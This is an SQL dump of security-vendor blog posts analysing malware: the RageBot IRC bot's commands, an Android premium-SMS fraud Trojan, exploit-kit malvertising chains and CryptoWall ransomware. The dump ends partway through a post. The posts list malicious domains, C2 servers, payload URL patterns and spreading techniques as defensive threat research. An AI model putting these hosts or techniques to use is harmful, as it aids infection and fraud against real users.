Mar-15\r\n			37A9570400CB0C0CD4E5273AE3232EB5\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			E59BCA5EE865FE5789C96B20A43F9207\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			919C861E6A6ABF88045476D5D92A5DE1\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			5FD98DE177F158C31960BF80272F2535\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			9439AA18598643131B3F8DD9E69AB294\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			F66A06166B73391C4C7A7A58CC6CE66C\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			79589FC33375A63BB44A8DE0B2B5DAF8\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			2C328EF3F2074D68729F329D4B2F8013\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			90E8FF73C7E78B99ABCD1FC22394F22E\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			A3AEC401831AF6EF1C75AFB1C50D96DA\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			42C7C8719D33AFCF36DC7D5D2594EB5B\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			375E51758336183B07CA7DBF771D2EF8\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			FA20E413002E17B938B2451552721027\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			09840FA1887528B20C98C408C8EB6E07\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			6AB2975E77EA4724FADF4CCB7250F0E9\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			51E7E34FFB5EF17FDE5FAFC5DF8F7212\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			F61E3F5ACFE1F861CECEA0A793D4F333\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			229236B39E92E629178419CB8A529E1A\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			D299AD2A61F325F5DA56AE7674D2F77D\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			53CA20232F358A9C256748403451EF14\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			41BE96D1B3BDF9E48D97AE153D6EFD45\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			213E0B42AF7CF1D0DCB75E378CA93512\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n	\r\n\r\n\r\n\r\nRageBot Commands\r\n\r\n \r\n\r\n	\r\n		\r\n			Command\r\n			Description\r\n		\r\n	\r\n	\r\n		\r\n			PING\r\n			Check status\r\n		\r\n		\r\n			422\r\n			Check status\r\n		\r\n		\r\n			433\r\n			Redefine nick name\r\n		\r\n		\r\n			-s\r\n			Silent mode\r\n		\r\n		\r\n			h 0f6969d7052da9261e31ddb6e88c136e\r\n			Uninstall bot.\r\n		\r\n		\r\n			h fd456406745d816a45cae554c788e754\r\n			Download and run file\r\n		\r\n		\r\n			Botinfo\r\n			Sends botinfo\r\n		\r\n		\r\n			p2p\r\n			Starts p2p spread, Copy itself into following location-\r\n			\\Program Files\\LimeWire\\Shared\r\n			\\Program Files\\eDonkey2000\\incoming\r\n			\\Program Files\\KAZAA\r\n			\\Program Files\\Morpheus\\My Shared Folder\\\r\n			\\Program Files\\BearShare\\Shared\\\r\n			\\Program Files\\ICQ\\Shared Files\\\r\n			\\Program Files\\Grokster\\My Grokster\\\r\n			\\My Downloads\\\r\n		\r\n		\r\n			commands\r\n			Sends following list of commands\r\n			commands: botinfo/rarworm/xpl/p2p/vncstop/disconnect/reconnect/nick/restart/part/join/\r\n		\r\n		\r\n			rarworm\r\n			Scan for .rar files and copy itself into .rar archives with name as ?self-installer.exe?\r\n		\r\n		\r\n			disconnect\r\n			Disconnect itself\r\n		\r\n		\r\n			b0tk1ller (off)\r\n			Starts a thread that scans for the running processes and terminate the process if process name matched with hardcoded process names.\r\n			If parameter off is provided it stops the bot killer thread.\r\n		\r\n		\r\n			reconnect\r\n			Reconnects to the same server\r\n		\r\n		\r\n			reconnect.next\r\n			Same as reconnect since there is only one ip hardcoded in the bot.\r\n		\r\n		\r\n			nick (nickname)\r\n			Sets nick name if nickname not provided that generates random nickname\r\n		\r\n		\r\n			restart\r\n			Restarts itself\r\n		\r\n		\r\n			vncstop\r\n			Stop VNC scanning threads.\r\n		\r\n		\r\n			join (channel_name)\r\n			Join mentioned channel\r\n		\r\n		\r\n			xpl\r\n			Starts vnc and ftp scanning threads.\r\n		\r\n	\r\n\r\n\r\nAnalysis by: Amandeep Kumar, Avinash Kumar, Nirmal Singh & Deepen Desai', 'Malware', 'https://www.zscaler.com/blogs/research/irc-botnets-alive-effective-evolving');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (147, 'Fake Porn Site Serving Chinese SMS Trojan', 'Viral Gandhi', 'April 22, 2015', 'The majority of Android malware continues to target Android devices that permit the installation of apps beyond the official Google Play store. Often, the malicious Android apps are delivered via third party app stores, but we do also see rogue apps delivered directly from malicious sites. Recently, we came across a fake porn site which is serving a Chinese SMS Trojan.           http://baidu-google{-}sogou-soso-360-qq.lrh6.com/cdn/index.html?l{}=banmeng&uid=3002&t=ar                     	  		  			  		  		  			Malware payload.  		  	           The above screenshot shows the malicious APK file being downloaded following user acceptance. When a user visits the page and attempts to view a video they will then be prompted to install an app. The user is social engineered into believing that installing the app is necessary to view the video, but in doing so, they are actually installing the malicious app that will carry out SMS fraud.    File Info:    Md5: 96caed56d6d735dd14a21a4d504e82c3.    Name: GA2161.apk    Size: 0.9 MB.    Package name: iickcf.ndakik.feockk.gcahbp.oefdnc.omeonn         Interestingly, the payload filename is dynamically generated and will change with each new download. This is likely an attempt to bypass basic blacklisting of a known malicious app name.           	  		  			  		  		  			Changing APK names  		  	           Upon successful infection, the following icon is visible to the end user on their mobile phone:            	  		  			  			  			  		  		  			  			Icon of installed malware  			  		  	        The malware then declares a Broadcast Receiver, which is registered to intercept all future SMS messages received by the user. The received message is analyzed by the malware to determine where it was received from. Once the sender\'s identity is confirmed, it parses the content of the received messages and matches it against certain hard coded message strings as seen below:         	  		  			  		  		  			Receives SMS.  		  	      The following is the list of hard coded Chinese message strings and their English translations:           	  		  			  		  		  			Hard coded message strings.  		  	        	  		  			  		  		  			Translated Chinese message strings [Credit: Google]  		  	         The intention of the malware author is clear from these message strings. The app generates fraudulent transactions from an infected device by purchasing on-demand videos and premium SMS services controlled by the attacker. SMS messages are generated by the app to initiate a purchase. The app then monitors incoming SMS messages to identify the purchase validation message, which must be accurately responded to in order to complete the transaction. When the validation message has been intercepted, it is parsed and matched against the hardcoded strings in the image above, to determine and submit the appropriate response. Once this occurs, the transaction is complete and the victim will be charged by their mobile provider.           	  		  			  		  		  			SMS Trojan Fraud cycle  		  	           	  		  			  		  		  			SMS send function.  		  	    The malware also leverages the International Mobile Subscriber Identity (IMSI) property for determining the location of the device, as well as service provider information as seen below:         	  		  			  		  		  			Checks for IMSI.  		  	        After a successful SMS send operation, the app submits a POST request to its Command & Control (C2) server \'msg-web.pw\' on port 8456.       	  		  			  		  		  			Post request.  		  	        The app sends the following information to the C2 server:         	  		  			  		  		  			Post request capture.  		  	        We were able to observe portions of the C2 server panel used by the malware author due to a lack of authentication applied to specific web pages. The administration panel used to manage the Trojan can be seen in the screenshots below:         	  		  			  		  		  			C&C Panel Login  		  	                	  		  			  		  		  			  			C&C Panel Actions  			  		  	      It also sends the same information to IP Address 115.28.252.178, which appears to be an alternate C2 server for the same Trojan:             	  		  			  		  		  			  			Portal 3  			  		  	                 	  		  			  		  		  			  			Post request.  			  		  	        The malicious app then sends a POST request checking for updates and in response, receives a URL pointing to a JAR file named \"firstpay_v7.0.jar\" as seen below:         	  		  			  		  		  			Jar file location  		  	        This jar file consists of a Dex file which is capable of running on the infected mobile device as seen below:        	  		  			  		  		  			Dex execution.  		  	           Below you can see the warning message dislayed by the phone when sending an SMS message which may incur additional charges.         	  		  			  		  		  			Money warning  		  	           Conclusion    This malware is yet another addition to the Android SMS Trojan Family. It scams the user by purchasing subscriptions for porn services, on-demand videos and sending premium rate SMS messages. SMS fraud remains the most common form of monetization that we see with malicious mobile apps and it is almost exclusively a problem on the Android platform. One simple yet effective defense, involves restricting app installation to reputable App stores such as those operated by Google & Amazon.           Research & Analysis by Viral and Shivang.', 'Malware;Mobile;Social Engineering', 'https://www.zscaler.com/blogs/research/fake-porn-site-serving-chinese-sms-trojan');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (148, 'Malvertising, Exploit Kits, ClickFraud & Ransomware: A Thriving Underground Economy', 'Deepen Desai', 'April 21, 2015', 'Malvertising  Malvertising involves using malicious online advertisements as a means to serve malware payloads to unsuspecting users. Cybercriminals leverage compromised advertising networks to serve malicious advertisements on legitimate websites which subsequently infect the visitors. This has become one of the most successful vectors of malware delivery for cybercriminals. Malvertising campaigns in most cases will involve a malicious advertisement redirecting the user to an Exploit Kit (EK) landing page.    Exploit Kits  Exploit Kits are web-based frameworks that attempt to exploit browser application plugins for known vulnerabilities. Upon successful exploitation, the EK will silently download and install a malware payload on the victim machine. The entire exploit cycle is completely hidden from the end user.    The Exploit Kit infection cycle typically moves through three distinct stages:    Stage 1 - Loading stage: This stage involves the initial delivery mechanism which causes the user to visit a compromised website or advertisement. This compromised website then leads the user to the actual Exploit Kit landing page which may involve a series of web redirects.    The initial delivery vector can be any of the following:    	Spam & phishing e-mail  	Social Networking sites  	SEO poisoning  	Compromised website  	Malvertising on legitimate sites    It is important to note that malvertising is one of the most dangerous and extremely successful initial delivery mechanism here as even the most cautious user is susceptible to this attack while visiting a perfectly legitimate website. In most other cases, a well informed user can avoid the attack by carefully inspecting the link in an e-mail or search results.    Stage 2 - Landing Stage: During this stage, the victim machine visits the actual EK hosting site and the exploit cycle is started. The EK code will attempt to exploit the identified vulnerable plugins by downloading the relevant exploit payloads.    Upon successful exploitation, the EK will lead to the download of the malware payload as configured by the EK operator. The entire exploit cycle may not require any user intervention in most cases, which greatly increases the success rates.    Stage 3 - Malware Payload Delivery: This is the final stage of the Exlpoit Kit infection cycle where the malware executable is downloaded and installed on the victim machine. This is usually achieved, after successful exploitation, by one of the EK payloads that was served during the landing stage.    The EK operators strive to ensure that the EK code, exploit payloads and the end malware payloads have very low to zero antivirus detection. Over the past few years, EK authors have implemented multiple new features to improve the effectiveness & infection success rates:    	Anti-VM and Anti-Analysis features  	Detection of known antivirus drivers  	Multiple levels of highly obfuscated JavaScript code  	Dynamic construction of exploit payload URLs only when a vulnerable plugin is found  	Short lived exploit payload URLs often restricted to one visit per IP address  	Obfuscated and repackaged exploit payloads  	Repackaged malware payloads    Recent Malvertising & EK campaigns  After last year’s infamous “Kyle & Stan” malvertising campaign that affected Google, Yahoo, YouTube and multiple other popular websites, this year has been no different. We have seen a malvertising campaign leading to a zero day Flash Exploit payload via the Angler EK to start of the year, followed by a Malvertising campaign targeting European Transit users. There have been numerous other instances of Malvertising which involved popular sites like huffingtonpost.com, yahoo.com, zillow.com and we only expect this trend to continue throughout the year.       	  		  			  		  		  			Malvertising attempts blocked [Last 7 days]  		  	        	  		  			  		  		  			Users targeted globally by Malvertising [Last 7 days]  		  	      Advanced techniques to evade detection  We have also noticed some new techniques being introduced in the Malvertising & EK exploit chain this year to further evade detection by URL reputation & network scanners:    	302 cushioning, or a \'cushion attack\', is used to redirect victims to malicious sites via simple HTTP 302 redirects rather than traditional techniques like iframes or JavaScript redirects which are easy to detect by network IDS/IPS devices.  	Domain Shadowing, involves compromising the parent domain and creating multiple sub-domains that point to malicious code.      Please refer to our most recent write-up describing it in more detail.    A typical Malvertising infection cycle would involve following stages:       	  		  			  		  		  			Malvertising infection cycle  		  	      Cybercrime Infrastructure & Business Model    Threat actors involved at different stages of the infection cycles are part of a thriving Cybercrime infrastructure & business model that is all interconnected as seen below:       	  		  			  		  		  			Cybercrime Infrastructure & Business Model  		  	      The top Exploit Kits that we have seen involved in various Malvertising campaigns in 2015 are:    	Angler  	Nuclear  	Magnitude  	RIG      Angler Exploit Kit      Angler Exploit Kit is one of the most prevalent exploit kits in existence today and has many similarities with other exploit kits. Victims are usually served Angler landing pages via compromised websites where an iframe or script has been injected into the compromised site\'s page and loads Angler\'s exploit page. The landing page for Angler is very similar to Nuclear, but instead of displaying totally randomized text for obfuscation, random passages from the novel \"Sense and Sensibility\" are used. Angler domains at first glance may look like legitimate domains, for example:    inspirablebacktenter.modernlifestyle[.]com         Angler EK operators are leveraging domain shadowing technique to shield their landing sites from URL categorization-based detection. Over the past few months, we\'ve seen Angler changing tactics somewhat. In late 2014, the landing page took the form of a 10 character alphanumeric php page, for example:     /l86dvw7qfp.php  /62ynh7h2e9.php  /ukvugw2mct.php    This format quickly changed to exclude the php extension, then changed to an entirely new format:    /govern_wickets_insulator/1305714616  /pews-bathrobe-understatement/2333676765  /pions_fingertips_rebuff/8057907058341  /pounces-garrotted-bedfellow-mingling/387249683138585374    This is another attempt to blend in with normal looking web traffic. Exploit pages and payloads have a similarly consistent format that has not noticeably changed since late 2014:    /3R6sqI6COwSVqj-FeU2X7WK5qWYlpQskmTr-ivR7ZSZuIbap/9Oj96BjEJ7Rpe-CuvXMl_DVaDQFeQV53vYrJekoio1vi9dIc/eS9vXVpGOZhiD1CflWv8J9AeWGa_auetZVWzsTeBZqZTSXlR/VZsq9DV0HzNyc0_HxSiYUpc4_NiyZW729YthGRWUQOssgshN/JQqtNNYjlHsJNYAFZDsQEJIFAF227hht8nMx0qCyo6HRXuO8      The majority of the recent Angler EK infections were serving the Bedep AdFraud bot.       	  		  			  		  		  			Angler EK instances blocked  		  	        	  		  			  		  		  			Angler EK server locations  		  	        Nuclear Exploit Kit      Nuclear EK is arguably the most advanced exploit kit currently in use and includes a variety of different exploits. First appearing in 2009, the kit is very actively developed, with new exploits and defenses added incrementally over the years, and it is used to serve any number of payloads, including ransomware, click fraud, and multiple backdoors. Nuclear contains exploits for multiple common software components, including Flash, Internet Explorer, Java and Silverlight. Notably, in March 2015, the kit began including a Flash exploit for CVE-2015-0336 only a week after a patch was released by Adobe. Similar to Angler EK, Nuclear uses compromised webservers to serve exploits via 302-cushioning and domain shadowing, but free subdomain and dynamic DNS providers are also heavily used.    sstmxixcdr.serveftp[.]com/xqpjvl5oabhksk1fqq1bwl1afxdcs09xxxbjf1pdva.html  fu7bncm7xzjwu6hcfhuwwgg.90saniye[.]com/xvsobfbfaayaaxcou1gfcfvbs1wrefrrulaoebvovlfixfjkufgphacxulkl.html  azwbm2qdqs276gxw9qj82fg.akildakalici[.]net/rkklfaaacu1yh0aexaniauyvawypak8rcebtxquavh9ydl4kvvbsbfspulgxc1is.html  Using new subdomains of compromised sites enables Nuclear to evade older, domain-based blocking and allows for rapid rotation or one-time use of subdomains to hinder analysis by security researchers. In addition, before actually serving the exploit kit\'s landing page, potential victims are sent through an intermediary hop via 302-redirection; the victim is either 302-redirected to the landing page if this is a new victim, or sent to the desired non-malicious page.    Another interesting feature of Nuclear is that various fields are Base64-encoded and passed to the malicious domain:  ce79suqo5euujfchllkmwwf.alumni-year-book[.]com/index.php?a=cmtpbWJwZ2Q9cWEmdGltZT0xNTA0MTUwNjU0NjExNjY2ODgyJnNyYz0zMjImc3VybD1vbmVoYWxseXUuY29tJnNwb3J0PTgwJmtleT0xOUZGM0EwJnN1cmk9L3RvcGljLzQ0NzU0LSUyNUUyJTI1OTklMjVBNS10aGUtb2ZmaWNpYWwtJTI1RTIlMjU5OSUyNUE1LW5hbXNvbmctY291cGxlLSUyNUUyJTI1OTklMjVBNS10aHJlYWQtJTI1RTIlMjU5OSUyNUE1Lw==  --base64 decoded--  rkimbpgd=qa&time=1504150654611666882&src=322&surl=onehallyu.com&sport=80&key=19FF3A0&suri=/topic/44754-%25E2%2599%25A5-the-official-%25E2%2599%25A5-namsong-couple-%25E2%2599%25A5-thread-%25E2%2599%25A5/  Similar to Angler, the landing page contains sections of highly obfuscated JavaScript in between chunks of text; however, unlike Angler, Nuclear uses totally randomized text, which makes landing pages more difficult to detect using traditional signatures.    <textarea id=\'DjwvKE\' title=\'riaXWWvroLTqxkFhlrC\' name=\'MTdak\' cols=\'84\' rows=\'7\'>cbkKKLhgidYWpsNmcSUOJXFDrjdbvBIScsdmDKTlorIdjVQMnlaxJgAAPecLfkdIdGvgRPSFGbjqwACkmcivIjwYOYjuJNCmUySlNlrUMbKJbMuNpcJyMFWadGUnTXZnVsYjdQDqrOATbuhQXqPjvlJZseMLBmyXeXGInJyfYyzztgPQWeASQJsInFUprSMVqSddccJAbIzUoPlLuleLvWUjboYSHloxDRbgukhVthqixbtrNYDIuXsWMQpTBdQFvsmpcTLVBCDyexqrVtAQRsndJcxLGORBGDriXDEYFIXkGNbcG</textarea>  <h2>QMx sKWhYGWu eZJGyZ aFnKgWwC xfgcc KmTs rOETlec oBWPHKZ yVrHkWnM AXkEQvfe oPeaHHcdWk kYVRPcClQO GmV gQl</h2>  <h4>fQgQqXM gvllOkaC HknmN qvPFFFKKja TRNMxyHikW JYAb QOWuNSKTX mhzDYzV</h4>  The majority of the recent Nuclear EK infections were serving Teslacrypt Ransomware.         	  		  			  		  		  			Nuclear EK instances blocked  		  	        	  		  			  		  		  			Nuclear EK server locations  		  	      Magnitude Exploit Kit      Magnitude EK, like Angler and Nuclear, is heavily reliant on landing page javascript obfuscation as a means of both exploiting the victim’s system and hindering detection. First documented in October 2013, the kit targets users with outdated Browser application plugins and CVE-2015-0336 was recently included in the kit’s arsenal of exploits. This exploit kit has historically leveraged malvertising for distribution rather than compromising individual websites. ThreatLabZ has observed numerous ad networks being used as intermediaries, including one campaign which saw Yahoo! ads redirecting victims to Magnitude landing pages.         A Magnitude landing page is easy to spot at a glance since they typically have an unusually large number of subdomains, as seen in the examples below.    55e3a.76ec.b9.d9a6a.b863cb4.01962.4abd.c0s7894l6e3.basicmagic[.]pw/?17657271617e787b766376796376637e3974787a  ba5.861fa24.4f.f40.e0c1.f51.afb.47340.7a.o7faf55lqj.workerscertain[.]in/?2b594e4d5d4244474a5f4a455f4a5f4205484446    The payload page for these threats is the same hostname and domain followed by a 32-40 character hexadecimal string. The final payload is ransomware called CryptoWall 3.0, which encrypts the victim’s files. CryptoWall displays a message demanding payment for decrypting the files; this ransom increases depending on how long the victim waits. This is done to give the victim less time to find an alternative solution and to get the maximum amount of money from the victim.            	  		  			  		  		  			Magnitude EK instances blocked  		  	        	  		  			  		  		  			Magnitude EK server locations  		  	             RIG Exploit Kit      The RIG EK has been a relative newcomer to the exploit kit ecosystem. Since its debut in early 2014, it has been a prevalent threat to web-surfers. The developers have been very active in updating it with the latest features common to other exploit kits, and is currently making heavy use of domain shadowing. One major difference between RIG and others seems to be the modularity of the kit itself. RIG doesn\'t contain any exploits directly, but relies on a backend service for providing exploits. This is evidenced by the source code that was supposedly leaked by a RIG developer in February 2015. The leak seems to have been the result of internal squabbles between the developers, with the leak intended as a final blow to the development team. Customer posts on underground forums complained that their RIG deployments would occasionally be hijacked to deliver malware payloads that they did not designate for use. These issues point to a rogue developer in the RIG team, and the availability of the source will surely result in the emergence of derivative exploit kits.         Though RIG has made news by being injected into some major sites such as JQuery.org and AskMen.com, it appears that RIG is most frequently encountered via a combination of Malvertising and search poisoning. We commonly see redirectors that match the following two patterns:    domain.tld/search  domain.tld/search.php    There’s a two stage landing page that follows the redirectors, with the landing pages hosted on a variety of domain-shadowed hostnames:    far[.]capacitorsfordownhole[.]com  min[.]closinglawyer[.]net  deal[.]customdetonatorcapacitor[.]com  road[.]detonationcapacitor[.]com  home[.]autoqueen[.]net  calls[.]hightempcaps[.]com  add[.]hightempceramiccaps[.]com  top[.]highfrequencycapacitors[.]com  take[.]buriedbroadbandcapacitors[.]com  pro[.]customdetonatorcapacitor[.]com    An example of the redirector and two-stage landing page:               	  		  			  		  		  			Two-stage landing page  		  	                 Analysis of the URI paths on the landing pages shows that there are a few distinct parts. In the example above, the path “?xXmNd7GfKB7KA4M=l3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWA_0TfZl4W-5rBHbU6iw6gyLRGJMlzk0TQu2gCz-kaUEgbrA” features two distinct components separated by an equal sign (“=”). The first part (“xXmNd7GfKB7KA4M”) appears to be a unique client identifier while the much longer second part appears to be related to the overall campaign, with the same characters starting the string. A selection of campaign strings follow:    l3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWKrBLZZl9B_ZqXHOJqjl-gzeQSdpovwBbQuGhVxL4ZVUgbrAl3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioXX9RyJNA5A_8CUQrY80Vz0ybYWJMslzxCE7GMBzeMdVkgbrAl3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWB9RWMZQJArcHEHbYy3A_3neJGdJl0lUKA4TQFxbtPVUgbrAl3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWLqBXeMgoQrZOVE7k-31-nnLNHI8lywhfUvGJQmu5IVUgbrAl3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWE9RyKZQhBq5KQErIz2FSmnOUVeM11wUXU4TUDz7kYVEgbrAl3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWE9RyKZQhBq5KQErIz2FSmnOUVeM11wUXU4TUDz7kYVEgbrAl3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWK9BPcNAsT-MHBR-Bp3Vv1zbJBJJgllROB7mJXzLhLVEgbrA         	  		  			  		  		  			RIG EK instances blocked  		  	           	  		  			  		  		  			RIG EK server locations  		  	      Malware Payload: ClickFraud & Ransomware    Exploit kits can serve a variety of different payloads, from Backdoors and Ransomware, to generic Downloaders. We’ve noted that the ultimate goal of many exploit kits is to monetize the infected system as much as possible, most commonly via Adfraud/ClickFraud. To support this goal, a very common payload for exploit kits is the Trojan Bedep, which can download additional malware and is used to perpetrate advertising fraud. In order to evade detection, Bedep is usually downloaded in an encrypted form and decrypted in memory as part of the infection process. Once decrypted, Bedep uses a domain generation algorithm (DGA) to communicate with its command and control servers. This communication is over normal HTTP, but messages are encrypted and then Base64 encoded, making analysis and detection more difficult.    When used for advertising fraud, Bedep creates a hidden desktop (a desktop instance not visible to the end user), shown below, that is not normally accessible in Windows, then begins displaying loading web pages and advertisements to commit advertising fraud.              	  		  			  		  		  			Bedep Adfraud traffic & hidden desktop used to display Ads  		  	         Multiple windows are created to display ads (shown below) and in practice, this heavily impacts the performance of the infected system.         	  		  			  		  		  			Bedep displaying multiple Ads on hidden desktop  		  	           Pages are quickly cycled to make as much money from the Ads as possible. In general, Bedep’s Adfraud traffic takes the form of ‘/r.php?key=’ or ‘/ads.php?sid=’ followed by a 32-character alphanumeric string, for example:    keppertoolsmaster[.]com/r.php?key=722445fbcd3e90f18f451c1344bdcc85  Another popular payload for exploit kits is ransomware, such as CryptoLocker and CryptoWall. This type of ransomware encrypts files on an infected system, and then demands payment to decrypt the files. CryptoLocker was first discovered in 2013 and quickly became popular due to the use of asymmetric encryption to hold user’s files for ransom, which is expected to be paid in Bitcoins. Additionally, recent samples contact a command and control infrastructure hosted on TOR hidden servers via TOR proxy gateways, such as tor2web.org. ThreatLabZ recently analyzed a sample of CryptoWall 3.0, a derivative clone of CryptoLocker, and found the binaries were hosted with a “.jpg” extension to avoid raising suspicion. Some of the other features of this CryptoWall sample include:      	Decryption service hosted on TOR  	CAPTCHA on decryption service  	High ransom amount (700 USD, increasing to over 1400 USD)  	Multiple payment options accepted besides Bitcoin    Ransomware is an attractive payload for criminals since many individuals and companies with no or incomplete data backups are likely to pay the ransom to recover sensitive files. Since the victim’s files are already encrypted, there is little to fear from traditional anti-virus signatures or blocking command and control traffic. Finally, even if someone pays the ransom, there is no guarantee that any files will be decrypted.    Multi-tasking example from a recent infection  A recent development we’ve observed is using Bedep to install ransomware as well as committing advertising fraud. In the observed sample, Angler EK first installed Bedep on the compromised system, which immediately downloaded a piece of ransomware called “Threat Finder v2.4.” Like other popular ransomware, Threat Finder displays a “HELP_DECRYPT” message which instructs users to send 300 USD of Bitcoins to a Bitcoin wallet in order to decrypt files. The screenshot below shows both the Threat Finder ransom window and advertising fraud sessions captured by Fiddler. Installing both ransomware and committing advertising fraud potentially generates even more money for the perpetrators.              	  		  			  		  		  			Threat Finder v2.4, Bedep, dual infection  		  	                	  		  			  		  		  			Trust us, we\'ll decrypt your files.... but only if you pay!  		  	         Conclusion  Malvertising campaigns have seen a significant uptick in 2015 and continue to be the most lucrative initial delivery mechanism for Exploit Kits. The fact that the legitimate websites becoming target of these campaigns have very little to no control for preventing such attacks makes this a very dangerous vector and a popular choice for cybercriminals.    The users should ensure that all the Browser application plugins are always patched with latest updates and disable the plugins that are not used. We also highly recommend using click-to-play feature available in many browser for Java & Flash plugins.    Analysis by: Deepen Desai, John Mancuso, Ed Miles, Chris Mannon', 'Advertising;Analysis;Click Fraud;Exploit;Exploit Kit;Malware;Ransomware', 'https://www.zscaler.com/blogs/research/malvertising-exploit-kits-clickfraud-ransomware-thriving-underground-economy');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (149, 'CryptoWall 3.0 Campaign Still Kicking', 'Chris Mannon', 'April 08, 2015', 'A scary proposition for organizations and consumers alike is the possibility of being hit by a ransomware campaign. Ransomware threats have been known to spread through targeted spam campaigns, compromised WordPress sites, or Exploit Kits. The purpose of this attack is to encrypt all files on the victim\'s system and extort the user for money to gain access to their sensitive files. Attackers leverage anonymizer networks such as TOR to cover their tracks when accepting any payment from their victims.\r\n\r\nIn this blog, we cover a campaign involving CryptoWall 3.0 ransomware. The attack campaign that we are monitoring involves malicious executable files disguised as JPEG image files. The URL format for these downloads adheres to the following patterns:\r\n \r\nhttp://[domainname]/images/[one|two].jpg\r\nNameserver used: ns[1-4].dervoilrtd.org\r\n\r\n \r\nSample URLs serving CryptoWall 3.0\r\n\r\n\r\n\r\n	dorttlokolrt[.]com/images/one[.]jpg\r\n	dorttlokolrt[.]com/images/two[.]jpg\r\n	indsertgamert[.]org/images/one[.]jpg\r\n	indsertgamert[.]org/images/two[.]jpg\r\n	davis1[.]ru/images/one[.]jpg\r\n	davis1[.]ru/images/two[.]jpg\r\n	downs1[.]ru/images/one[.]jpg\r\n	downs1[.]ru/images/two[.]jpg\r\n	ellison1[.]ru/images/one[.]jpg\r\n	ellison1[.]ru/images/two[.]jpg\r\n	manning1[.]ru/images/one[.]jpg\r\n	manning1[.]ru/images/two[.]jpg\r\n\r\n\r\nThe downloaded file deletes the original copy of itself and begins encrypting all the victim\'s files using an asymmetric encryption method.  For each file it encrypts, it leaves behind a HELP_DECRYPT.[PNG|HTML|TXT|URL] file to instruct the victim on how to recover their files. \r\n\r\n \r\n\r\n\r\n \r\n\r\n \r\n \r\n\r\nFollowing a successful infection cycle, the end-user will be shown a pop-up of the HELP_DECRYPT file to make sure that the victim is fully aware of the attack on their system. The instructions contain a TOR link to recover their now encrypted sensitive files. Following the links from the HELP_DECRYPT file leads to a Decryption Service page performing a CAPTCHA check to ensure it\'s a human on the other end.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			CAPTCHA check for Decryption Service page\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\n\r\nThe malware performs a POST request to the following domains relaying the data from the victim\'s system to one of the following Command & 